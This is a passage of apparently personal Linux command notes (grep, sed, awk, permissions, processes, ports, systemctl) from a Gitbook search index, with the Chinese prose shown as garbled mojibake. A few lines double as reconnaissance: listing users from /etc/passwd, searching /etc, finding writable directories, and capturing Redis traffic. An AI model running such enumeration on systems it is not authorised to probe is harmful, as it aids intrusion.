#!/bin/bash count=1 while [ \"$count\" -le 10 ] do echo $count count=$(($count+1)) done shellç»Ÿè®¡å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ä¸ªæ•°ã€ç›®å½•ä¸ªæ•° https://blog.csdn.net/weixin_44203158/article/details/109727981 sort https://blog.csdn.net/linggang_123/article/details/118552536 grep åœ¨/etc/ç›®å½•ä¸‹å¯»æ‰¾æ–‡ä»¶é‡ŒåŒ…å«mysqlå­—ç¬¦çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å…¶æ–‡ä»¶åã€‚ grep -rl 'mysql' /etc -rï¼šé€’å½’æŸ¥æ‰¾ -lï¼šåªæ‰“å°æ–‡ä»¶å sed sæ¨¡å¼---å­—ç¬¦æ›¿æ¢ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ cat data The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ sed 's/dog/cat/' data The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ cat data The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. sedç¼–è¾‘å™¨å¹¶ä¸ä¼šä¿®æ”¹æ–‡æœ¬æ–‡ä»¶çš„æ•°æ®ã€‚å®ƒåªä¼šå°†ä¿®æ”¹åçš„æ•°æ®å‘é€åˆ°STDOUTã€‚å¦‚æœä½ æŸ¥çœ‹åŸæ¥çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒä»ç„¶ä¿ç•™ç€åŸå§‹æ•°æ®ã€‚ å°†sedç»“æœé‡å®šå‘åˆ°å…¶ä»–æ–‡ä»¶å³å¯ã€‚ å‚æ•° -e å¤šæ¡sedå‘½ä»¤æ‰§è¡Œ sed -e 's/brown/green/; s/dog/cat/' data1.txt å‚æ•° -f sed -f script1.sed data1.txt å®ç°äº†sed -e 's/brown/green/; s/dog/cat/' data1.txt script1.sed s/brown/green/ s/dog/cat/ -n ä¸äº§ç”Ÿè¾“å‡º awk è¿™ä¸ªå‘½ä»¤ä¸»è¦çš„ä½œç”¨å°±ç›¸å½“äºsplitï¼Œformatï¼Œå­—ç¬¦ä¸²åˆ†å‰²ï¼Œæ ¼å¼åŒ– è¾“å‡ºæ‰€æœ‰ç”¨æˆ· cat /etc/passwd | awk -F ':' '{print $1}' awk -FæŒ‡å®šåŸŸåˆ†éš”ç¬¦ä¸º':'ï¼Œå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚ é»˜è®¤åˆ†éš”ç¬¦ä¸ºç©ºæ ¼ $IFS ç±»ä¼¼äºpythonçš„.split()æ–¹æ³• $IFSå†…éƒ¨åŸŸåˆ†éš”ç¬¦,é»˜è®¤ä¸ºç©ºæ ¼/Tab/æ¢è¡Œ ä¹Ÿå¯ä»¥æŒ‡å®šIFSçš„å€¼ï¼Œå°†å€¼æ›¿æ¢ä¸ºç©ºæ ¼/Tab/æ¢è¡Œ string=\"k?haz\" IFS='?' echo $string >>k haz Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-08 11:08:39 "},"07.åŸºç¡€çŸ¥è¯†/Linux/Linuxå‘½ä»¤.html":{"url":"07.åŸºç¡€çŸ¥è¯†/Linux/Linuxå‘½ä»¤.html","title":"Linuxå¸¸ç”¨å‘½ä»¤","keywords":"","body":"Linuxä¸€åˆ‡çš†æ–‡ä»¶ æ²¡æœ‰ä¿¡æ¯å°±æ˜¯å¥½æ¶ˆæ¯ï¼Œè¯´æ˜å‘½ä»¤æˆåŠŸäº†ã€‚ æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ uname -a åå°è¿è¡Œç¨‹åº åå°è¿è¡Œ nohup cmd & # è¾“å‡ºä¼šé‡å®šå‘åˆ°nohup.outä¸­æˆ–è€…nohup cmd >hello.log & æŒ‡å®šè¾“å‡ºåˆ°hello.logä¸­ yum install screen # å®‰è£… screen -S [$Name] # åˆ›å»ºçª—å£ screen cmd # åœ¨çª—å£ä¸­æ‰§è¡Œå‘½ä»¤ screen -ls # åˆ—å‡ºçª—å£ screen -r [$Name] # å†æ¬¡è¿æ¥sshæ—¶æ¢å¤ä¼šè¯ æŸ¥çœ‹åå°ç¨‹åº jobs -l # åˆ—å‡º kill %num # æ€æ­»åå°ä½œä¸š æ–‡ä»¶ åˆ›å»ºæ–‡ä»¶ vi /vim filenameï¼šæ–‡æœ¬ç¼–è¾‘å™¨ touch filenameï¼šåˆ›å»ºç©ºæ–‡ä»¶ é‡å®šå‘åˆ›å»º echo \"string\" > filename cat > filenameï¼šè¾“å…¥æ–‡ä»¶å†…å®¹ï¼Œctrl+dä¿å­˜å¹¶é€€å‡º å¤åˆ¶æ–‡ä»¶/ç›®å½• cp file_path xx å½“xxä¸ºæ–‡ä»¶æ—¶ï¼Œå³åˆ›å»ºfileçš„å‰¯æœ¬xx å½“xxä¸ºç›®å½•æ—¶ï¼Œå³å°†fileå¤åˆ¶åˆ°xxç›®å½•ä¸‹ å¯é€‰å‚æ•°ï¼š-R å¤åˆ¶æ–‡ä»¶å¤¹ æ–‡ä»¶é“¾æ¥ è½¯é“¾æ¥/ç¬¦å·é“¾æ¥ ln -s æºæ–‡ä»¶å å¿«æ·æ–¹å¼åï¼ˆè½¯è¿æ¥ï¼Œåªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼‰ ç¡¬é“¾æ¥ ln æºæ–‡ä»¶å æ–‡ä»¶åï¼ˆç¡¬é“¾æ¥ï¼Œä¸¤ä¸ªæ–‡ä»¶æ˜¯åŒæ­¥çš„ï¼Œå°±æ˜¯å¯¹ä»»æ„ä¸€ä¸ªæ“ä½œï¼Œéƒ½ä¼šå½±å“åˆ°ä¸¤ä¸ªï¼‰ äºŒè€…åŒºåˆ« åˆ é™¤äº†æºæ–‡ä»¶ï¼Œè½¯è¿æ¥å°±å¤±æ•ˆäº†ï¼Œè€Œç¡¬é“¾æ¥ç›¸å½“äºå‰¯æœ¬ï¼Œä¸å—å½±å“ã€‚ é‡å‘½åæ–‡ä»¶/ç›®å½• åœ¨Linuxä¸­ï¼Œé‡å‘½åæ–‡ä»¶ç§°ä¸ºç§»åŠ¨ï¼ˆmovingï¼‰ mv name1 name2ï¼šæ›´æ”¹æ–‡ä»¶å/ç›®å½•å mv name dir_pathï¼šç§»åŠ¨æ–‡ä»¶/ç›®å½• mv file_path dir_path+file_name2ï¼šç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å åˆ é™¤æ–‡ä»¶ åœ¨Linuxä¸­ï¼Œåˆ é™¤ï¼ˆdeletingï¼‰å«ä½œç§»é™¤ï¼ˆremovingï¼‰ã€‚ rm filename -iï¼šåˆ é™¤å‰è¯¢é—® -fï¼šå¼ºåˆ¶åˆ é™¤ è¯»å–æ–‡ä»¶ å‘½ä»¤ ä½œç”¨ å¯é€‰å‚æ•° cat/tac ä»å¤´åˆ°å°¾æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆtacç›¸åï¼‰ -nï¼šæ˜¾ç¤ºè¡Œå· head/tail è¯»å–å‰/ålinesè¡Œ --lines=ï¼Ÿ nl æ˜¾ç¤ºè¡Œå·å’Œå†…å®¹ sort æ’åºæ–‡ä»¶å†…å®¹å¹¶æ˜¾ç¤º more åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ uniq å»é‡åï¼Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ less ä¸€æ¬¡æ˜¾ç¤ºä¸€å±çš„æ–‡ä»¶æ–‡æœ¬ paste å¯ä»¥å°†ä¸¤ä¸ªæ–‡æœ¬æŒ‰åˆ—æ‹¼æ¥åˆ°ä¸€èµ·æ˜¾ç¤º strings è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆcatä¸èƒ½è¯»å–äºŒè¿›åˆ¶ï¼‰ æœç´¢æ–‡ä»¶å†…å®¹ grep string filename ï¼šåœ¨fileä¸­æŸ¥æ‰¾åŒ¹é…stringçš„å†…å®¹ å‚æ•°ï¼š åŠŸèƒ½ ä¾‹å­ -v åå‘æœç´¢ grep -v t file1 -n æ˜¾ç¤ºè¡Œå· grep -n t file1 -e å¤šä¸ªåŒ¹é…æ¨¡å¼ grep -e t -e f file1ï¼šåŒ¹é…tå’Œfå­—ç¬¦ æ­£åˆ™ æŸ¥çœ‹æ–‡ä»¶ç±»å‹/çŠ¶æ€ file filename stat filename è§£å‹ç¼©æ–‡ä»¶ èµ‹äºˆæ–‡ä»¶æƒé™ chmod +rw filename tar è§£åŒ…ï¼štar xvf FileName.tar æ‰“åŒ…ï¼štar cvf FileName.tar DirName ï¼ˆæ³¨ï¼štaræ˜¯æ‰“åŒ…ï¼Œä¸æ˜¯å‹ç¼©ï¼ï¼‰ æ–‡ä»¶æƒé™ ç†è§£æƒé™ [root@izwz99bgx9y93dmv0mir0ez ~]# ls -l total 16 -rwxrwxr-x 1 rich rich 4882 2010-09-18 13:58 myprog .... -rwxrwxr-xè§£è¯»ä¸º-ï¼Œrwxï¼Œrwxï¼Œr-x ç¬¬ä¸€ä¸ªå­—ç¬¦ | å­—ç¬¦ | å«ä¹‰ | | :--: | :------------: | | - | ä»£è¡¨æ–‡ä»¶ | | d | ä»£è¡¨ç›®å½• | | l | ä»£è¡¨é“¾æ¥ | | c | ä»£è¡¨å­—ç¬¦å‹è®¾å¤‡ | | b | ä»£è¡¨å—è®¾å¤‡ | | n | nä»£è¡¨ç½‘ç»œè®¾å¤‡ | åé¢9ä¸ªå­—ç¬¦ï¼Œæ¯ä¸‰ä¸ªä¸ºä¸€ç»„ | å­—ç¬¦ | å«ä¹‰ | æ¯ä¸€ç»„å¯¹åº”çš„å®‰å…¨çº§åˆ« | | :--: | :----------------: | :------------------: | | r | ä»£è¡¨å¯¹è±¡æ˜¯å¯è¯»çš„ | æ–‡ä»¶å±ä¸»çš„æƒé™ | | w | ä»£è¡¨å¯¹è±¡æ˜¯å¯å†™çš„ | å±ä¸»æˆå‘˜çš„æƒé™ | | x | ä»£è¡¨å¯¹è±¡æ˜¯å¯æ‰§è¡Œçš„ | å…¶ä»–ç”¨æˆ·çš„æƒé™ | è‹¥æ²¡æœ‰æŸç§æƒé™ï¼Œåœ¨è¯¥æƒé™ä½ä¼šå‡ºç°å•ç ´æŠ˜çº¿ã€‚ å±ä¸»æˆå‘˜æŒ‡çš„æ˜¯ä¸æ–‡ä»¶å±ä¸»åœ¨åŒä¸€ä¸ªç”¨æˆ·ç»„çš„æˆå‘˜ å…¶ä»–ç”¨æˆ·æŒ‡çš„æ˜¯ä¸æ–‡ä»¶å±ä¸»ä¸åœ¨åŒä¸€ä¸ªç”¨æˆ·ç»„çš„æˆå‘˜ æ”¹å˜æƒé™ chmod å…«è¿›åˆ¶æ³• sudo chmod 777 filename 777ç”±ä¸Šå›¾å¯çŸ¥æ˜¯èµ‹äºˆå…¨éƒ¨æƒé™ è®¾ç½®é»˜è®¤æƒé™ umask æ–‡ä»¶æƒé™=777-umask=755 ç›®å½• æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶ ls å¯é€‰å‚æ•° åŠŸèƒ½ -l æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ -a æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶ï¼‰ -R å±•ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ -i å±•ç¤ºæ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹ -F å±•ç¤ºæ–‡ä»¶ç±»å‹ -F ç›®å½•ååŠ ä¸Š/ å¯æ‰§è¡Œæ–‡ä»¶ååŠ ä¸Š* dir vdir ç­‰ä»·äº ls -l æŸ¥çœ‹ç›®å½•ç»“æ„ tree dir åˆ›å»ºç›®å½• mkdir dir_nameï¼šåˆ›å»ºå•ä¸ªç›®å½• mkdir dir1/dir2/dir3ï¼šåˆ›å»ºå¤šä¸ªç›®å½• åˆ é™¤ç›®å½• rmdir dir_nameï¼šåˆ é™¤ç©ºç›®å½• rm -rf dir_nameï¼šåˆ é™¤éç©ºç›®å½• ä¸ä½¿ç”¨-få‚æ•°çš„è¯ï¼Œéœ€è¦ä¸€ä¸€ç¡®å®šæ˜¯å¦åˆ é™¤å­ç›®å½•å’Œæ–‡ä»¶ æ›´å®‰å…¨ï¼Œä½†æ˜¯æ›´éº»çƒ¦ åˆ‡æ¢åˆ°æŸä¸ªç›®å½• cd dir_path æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½• pwd è¿›ç¨‹--process æŸ¥çœ‹è¿›ç¨‹ ps æ˜¾ç¤ºäº†ç¨‹åºçš„è¿›ç¨‹IDï¼ˆProcess IDï¼ŒPIDï¼‰ï¼Œå®ƒä»¬è¿è¡Œåœ¨å“ªä¸ªç»ˆç«¯ï¼ˆTTYï¼‰ï¼Œä»¥åŠè¿›ç¨‹å·²ç”¨çš„CPUæ—¶é—´ã€‚ ps -ef ps -aux | grep apache # ä¸grepè”ç”¨æŸ¥æ‰¾apacheè¿›ç¨‹ -A æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ a æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ -a æ˜¾ç¤ºåŒä¸€ç»ˆç«¯ä¸‹æ‰€æœ‰è¿›ç¨‹ c æ˜¾ç¤ºè¿›ç¨‹çœŸå®åç§° e æ˜¾ç¤ºç¯å¢ƒå˜é‡ f æ˜¾ç¤ºè¿›ç¨‹é—´çš„å…³ç³» r æ˜¾ç¤ºå½“å‰ç»ˆç«¯è¿è¡Œçš„è¿›ç¨‹ -aux æ˜¾ç¤ºæ‰€æœ‰åŒ…å«å…¶å®ƒä½¿ç”¨çš„è¿›ç¨‹ top ä¸psä¸åŒçš„ç‚¹åœ¨äºï¼Œpsåªèƒ½æ˜¾ç¤ºä¸€ä¸ªæ—¶é—´ç‚¹çš„è¿›ç¨‹ä¿¡æ¯ï¼Œè€Œtopæ˜¯å®æ—¶æ›´æ–°ï¼Œå°±åƒwindowsçš„ä»»åŠ¡ç®¡ç†å™¨ã€‚ äº¤äº’å‘½ä»¤ï¼šè¾“å…¥qé€€å‡ºtopå‘½ä»¤ã€‚ lsof lsof -p pid //æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€äº†å“ªäº›æ–‡ä»¶ ç»“æŸè¿›ç¨‹ åœ¨Linuxä¸­ï¼Œè¿›ç¨‹ä¹‹é—´é€šè¿‡ä¿¡å·æ¥é€šä¿¡ã€‚ kill pidï¼šé€šè¿‡è¿›ç¨‹çš„pidæ¥ç»“æŸè¿›ç¨‹ kill -9 pidï¼šå¼ºåˆ¶ç»“æŸ killall process_nameï¼šé€šè¿‡è¿›ç¨‹åç»“æŸè¿›ç¨‹ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰ killall http* ä¸Šé¢çš„å‘½ä»¤ç»“æŸäº†æ‰€æœ‰ä»¥httpå¼€å¤´çš„è¿›ç¨‹ ç”¨æˆ· åˆ‡æ¢ç”¨æˆ· su - ç”¨æˆ·å é«˜æƒé™åˆ‡æ¢ä½æƒé™æ— éœ€å¯†ç ï¼Œåä¹‹éœ€è¦ã€‚ æŸ¥çœ‹ç¬¬ä¸€æ¬¡ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ· who am i ç‰¹æ®Šç¬¦å· åŠŸèƒ½ # æ³¨é‡Šåé¢çš„å‘½ä»¤ ï¼› ä¾æ¬¡æ‰§è¡Œå‘½ä»¤ \\ ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ \\ \\ å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ & åå°æ‰§è¡Œå‘½ä»¤ && å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ $? å­˜å‚¨ä¸Šä¸€æ¡å‘½ä»¤çš„æ‰§è¡Œç»“æœ ç½‘ç»œ æŸ¥çœ‹ip ip address show ifconfig æŠ“å–æœåŠ¡æµé‡ sudo tcpdump -i lo port 6379 -w redis.pcapng æŸ¥æ‰¾å‘½ä»¤ find # æŸ¥æ‰¾å¯å†™ç›®å½• find / -type d -writable locate #æ›´æ–°ç´¢å¼•æ•°æ®åº“ sudo updatedb ç«¯å£ ç«¯å£æ˜¯é€šè¿‡ç«¯å£å·æ¥æ ‡è®°çš„ï¼Œç«¯å£å·åªæœ‰æ•´æ•°ï¼ŒèŒƒå›´æ˜¯ä»0~65535 https://www.runoob.com/w3cnote/linux-check-port-usage.html lsof lsof -i:8000 //æŸ¥çœ‹8000ç«¯å£å ç”¨æƒ…å†µ netstat netstat -ntlp //æŸ¥çœ‹å½“å‰æ‰€æœ‰tcpç«¯å£ netstat -ntulp | grep 80 //æŸ¥çœ‹æ‰€æœ‰80ç«¯å£ä½¿ç”¨æƒ…å†µ netstat -ntulp | grep 3306 //æŸ¥çœ‹æ‰€æœ‰3306ç«¯å£ä½¿ç”¨æƒ…å†µ æœåŠ¡ systemctl command æœåŠ¡ command mean status æŸ¥çœ‹æœåŠ¡çŠ¶æ€ start å¯åŠ¨æœåŠ¡ restart é‡å¯æœåŠ¡ stop åœæ­¢æœåŠ¡ enable å¼€æœºè‡ªå¯æœåŠ¡ disable å–æ¶ˆå¼€æœºè‡ªå¯æœåŠ¡ reload:ä¸å…³é—­unitçš„æƒ…å†µä¸‹,é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶,è®©è®¾ç½®ç”Ÿæ•ˆã€‚ is- active:ç›®å‰æœ‰æ²¡æœ‰æ­£åœ¨è¿è¡Œä¸­ã€‚ is- enabled:å¼€æœºæ—¶æœ‰æ²¡æœ‰é»˜è®¤è¦å¯ç”¨è¿™ä¸ªunitã€‚ kill:ä¸è¦è¢«killè¿™ä¸ªåå­—å“ç€äº†,å®ƒå…¶å®æ˜¯å‘è¿è¡Œunitçš„è¿›ç¨‹å‘é€ä¿¡å· show:åˆ—å‡ºunitçš„é…ç½®ã€‚ mask:ç¦ç”¨æœåŠ¡ unmask:å–æ¶ˆå¯¹æœåŠ¡çš„ç¦ç”¨ list-unit-files|grep enable:åˆ—å‡ºæ‰€æœ‰è‡ªå¯åŠ¨æœåŠ¡ loadedï¼šå¼€æœºæ˜¯å¦è‡ªå¯åŠ¨ï¼Œenabledè¯´æ˜æ˜¯è‡ªå¯åŠ¨çš„ activeï¼šç°åœ¨æ˜¯å¦å¯åŠ¨ï¼Œactiveï¼ˆrunning)è¯´æ˜æ­£åœ¨ ä½¿ç”¨æŠ€å·§ ä¸ºå‘½ä»¤èµ·åˆ«å aliaså‘½ä»¤æ˜¯å¦ä¸€ä¸ªshellçš„å†…å»ºå‘½ä»¤ã€‚å‘½ä»¤åˆ«åå…è®¸ä½ ä¸ºå¸¸ç”¨çš„å‘½ä»¤ï¼ˆåŠå…¶å‚æ•°ï¼‰åˆ›å»ºå¦ä¸€ ä¸ªåç§°ï¼Œä»è€Œå°†è¾“å…¥é‡å‡å°‘åˆ°æœ€ä½ã€‚ alias åˆ«å='åŸå‘½ä»¤' ä¸‹é¢ä¸ºå±•ç¤ºéšè—æ–‡ä»¶çš„lså‘½ä»¤èµ·åˆ«åla [root@izwz99bgx9y93dmv0mir0ez ~]# alias la='ls -a' [root@izwz99bgx9y93dmv0mir0ez ~]# la . .. .bash_history .bash_logout .bash_profile .bashrc .cache .cshrc H1ve .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo web æ³¨æ„å‘½ä»¤åˆ«åå±äºå†…éƒ¨å‘½ä»¤ï¼Œä¸€ä¸ªåˆ«åä»…åœ¨å®ƒæ‰€è¢«å®šä¹‰çš„shellè¿›ç¨‹ä¸­æ‰æœ‰æ•ˆã€‚ å¯ä»¥é€šè¿‡åœ¨~/.bashrcæ–‡ä»¶å†…ç¼–å†™ï¼Œå·²è¾¾åˆ°æ°¸ä¹…ç”Ÿæ•ˆçš„æ•ˆæœ æ‰§è¡Œå†å²å‘½ä»¤ å…ˆç”¨historyå‘½ä»¤æŸ¥çœ‹å†å²å‘½ä»¤è®°å½•ï¼Œå†ç”¨ï¼+ å‘½ä»¤ç¼–å·æ‰§è¡Œå†å²å‘½ä»¤ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-11-16 16:48:56 "},"07.åŸºç¡€çŸ¥è¯†/Linux/Linuxå‘½ä»¤æœ¬è´¨.html":{"url":"07.åŸºç¡€çŸ¥è¯†/Linux/Linuxå‘½ä»¤æœ¬è´¨.html","title":"Linuxå‘½ä»¤æœ¬è´¨","keywords":"","body":"å‘½ä»¤æœ¬è´¨ å‘½ä»¤å®é™…ä¸Šå°±æ˜¯å…·æœ‰ä¸€å®šåŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶ å‘½ä»¤ä½ç½® /bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ /sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨ æ‰§è¡Œè¿‡ç¨‹ å‘½ä»¤åˆ†ç±»--å¤–éƒ¨å’Œå†…å»º å†…å»ºå‘½ä»¤å®é™…ä¸Šæ˜¯shellç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œç®€å•å¿«é€Ÿç³»ç»Ÿbashå†…ç½®æºç  æ¯”å¦‚ï¼šexitï¼Œhistoryï¼Œcdï¼Œechoç­‰ã€‚ å¤–éƒ¨å‘½ä»¤æ˜¯linuxç³»ç»Ÿä¸­çš„å®ç”¨ç¨‹åºéƒ¨åˆ†ï¼Œå¤–éƒ¨å‘½ä»¤çš„å®ä½“å¹¶ä¸åŒ…å«åœ¨shellä¸­ï¼Œä½†æ˜¯å…¶å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹æ˜¯ç”±shellç¨‹åºæ§åˆ¶çš„ã€‚å¤–éƒ¨å‘½ä»¤æ˜¯åœ¨bashä¹‹å¤–é¢å¤–å®‰è£…çš„ï¼Œé€šå¸¸æ”¾åœ¨/binï¼Œ/usr/binï¼Œ/sbinï¼Œ/usr/sbinç­‰ æŸ¥çœ‹å¤–éƒ¨å‘½ä»¤å­˜å‚¨ä½ç½® echo $PATH æ³¨ï¼šè¿™é‡Œçš„PATHå°±æ˜¯ç»å¸¸æåˆ°çš„ç¯å¢ƒå˜é‡ å½“ç”¨æˆ·æ‰§è¡Œçš„æ˜¯å¤–éƒ¨å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨æŒ‡å®šçš„å¤šä¸ªè·¯å¾„ä¸­æŸ¥æ‰¾commandçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œå®šä¹‰è¿™äº›è·¯å¾„çš„å˜é‡ï¼Œå°±ç§°ä¸º PATH ç¯å¢ƒå˜é‡ï¼Œå…¶ä½œç”¨å°±æ˜¯å‘Šè¯‰ Shell å¾…æ‰§è¡Œå‘½ä»¤çš„å¯æ‰§è¡Œæ–‡ä»¶å¯èƒ½å­˜æ”¾çš„ä½ç½®ï¼ŒShell ä¼šåœ¨ PATH å˜é‡åŒ…å«çš„å¤šä¸ªè·¯å¾„ä¸­é€ä¸ªæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ï¼ˆå¦‚æœæ‰¾ä¸åˆ°ï¼ŒShell ä¼šæä¾›ç”¨æˆ·â€œæ‰¾ä¸åˆ°æ­¤å‘½ä»¤â€ï¼‰ã€‚ åˆ¤æ–­å‘½ä»¤æ˜¯å¦ä¸ºå¤–éƒ¨è¿˜æ˜¯å†…å»ºå‘½ä»¤ type command [root@izwz99bgx9y93dmv0mir0ez ~]# type cd cd is a shell builtin [root@izwz99bgx9y93dmv0mir0ez ~]# type vim vim is /usr/bin/vim [root@izwz99bgx9y93dmv0mir0ez ~]# type ps ps is hashed (/usr/bin/ps) åŒºåˆ« å¤–éƒ¨å‘½ä»¤ å½“å¤–éƒ¨å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹ã€‚è¿™ç§æ“ä½œè¢«ç§°ä¸ºè¡ç”Ÿï¼ˆforkingï¼‰ã€‚å¤–éƒ¨å‘½ä»¤pså¾ˆæ–¹ä¾¿æ˜¾ç¤ºå‡ºå®ƒçš„çˆ¶è¿›ç¨‹ä»¥åŠè‡ªå·±æ‰€å¯¹åº”çš„è¡ç”Ÿå­è¿›ç¨‹ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 8986 8984 0 17:17 pts/0 00:00:00 -bash root 9054 8986 0 17:53 pts/0 00:00:00 ps -f psè¿›ç¨‹çš„PPIDä¸º-bashçš„PIDã€‚ å†…å»ºå‘½ä»¤ å†…å»ºå‘½ä»¤å’Œå¤–éƒ¨å‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰è€…ä¸éœ€è¦ä½¿ç”¨å­è¿›ç¨‹æ¥æ‰§è¡Œã€‚ å› ä¸ºæ—¢ä¸éœ€è¦é€šè¿‡è¡ç”Ÿå‡ºå­è¿›ç¨‹æ¥æ‰§è¡Œï¼Œä¹Ÿä¸éœ€è¦æ‰“å¼€ç¨‹åºæ–‡ä»¶ï¼Œå†…å»ºå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦è¦æ›´ å¿«ï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜ã€‚ æœ‰äº›å‘½ä»¤æœ‰å¤šç§å®ç°æ–¹å¼ [root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd cd is a shell builtin cd is /usr/bin/cd å¯¹äºæœ‰å¤šç§å®ç°çš„å‘½ä»¤ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨å…¶å¤–éƒ¨å‘½ä»¤å®ç°ï¼Œç›´æ¥æŒ‡æ˜å¯¹åº”çš„æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨å¤–éƒ¨å‘½ä»¤pwdï¼Œå¯ä»¥è¾“å…¥/bin/pwdã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:07:00 "},"07.åŸºç¡€çŸ¥è¯†/Windows/windowsåŸºæœ¬æ“ä½œ.html":{"url":"07.åŸºç¡€çŸ¥è¯†/Windows/windowsåŸºæœ¬æ“ä½œ.html","title":"windowsåŸºæœ¬æ“ä½œ","keywords":"","body":"Windowsæ³¨å†Œè¡¨ 1ã€å®šä¹‰ æ³¨å†Œè¡¨ï¼š Windowsæ“ä½œç³»ç»Ÿç§°ä¹‹ä¸ºç™»å½•æ¡£æ¡ˆã€‚æ˜¯Microsoft Windowsä¸­çš„ä¸€ä¸ªé‡è¦çš„æ•°æ®åº“ï¼Œæ³¨å†Œè¡¨æ˜¯ windowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ•°æ®åº“ï¼Œå…¶ä¸­å­˜æ”¾ç€å„ç§å‚æ•°ï¼Œç›´æ¥æ§åˆ¶ç€Windowsçš„å¯åŠ¨ã€ç¡¬ä»¶é©±åŠ¨ç¨‹åºçš„ è£…è½½ä»¥åŠä¸€äº›Windowsåº”ç”¨ç¨‹åºçš„è¿è¡Œï¼Œä»è€Œåœ¨æ•´ä¸ªç³»ç»Ÿä¸­èµ·ç€æ ¸å¿ƒä½œç”¨ã€‚è¿™äº›ä½œç”¨åŒ…æ‹¬äº†è½¯ã€ç¡¬ä»¶çš„ç›¸å…³é…ç½®å’ŒçŠ¶æ€ä¿¡æ¯ï¼Œæ¯”å¦‚æ³¨å†Œè¡¨ä¸­ä¿å­˜æœ‰åº”ç”¨ç¨‹åºå’Œèµ„æºç®¡ç†å™¨å¤–å£³çš„åˆå§‹æ¡ä»¶ã€é¦–é€‰é¡¹å’Œå¸è½½æ•°æ®ç­‰ï¼Œè”ç½‘è®¡ç®—æœºçš„æ•´ä¸ªç³»ç»Ÿçš„è®¾ç½®å’Œå„ç§è®¸å¯ï¼Œæ–‡ä»¶æ‰©å±•åä¸åº”ç”¨ç¨‹åºçš„å…³è”ï¼Œç¡¬ä»¶éƒ¨ä»¶çš„æè¿°ã€çŠ¶æ€å’Œå±æ€§ï¼Œæ€§èƒ½è®°å½•å’Œ 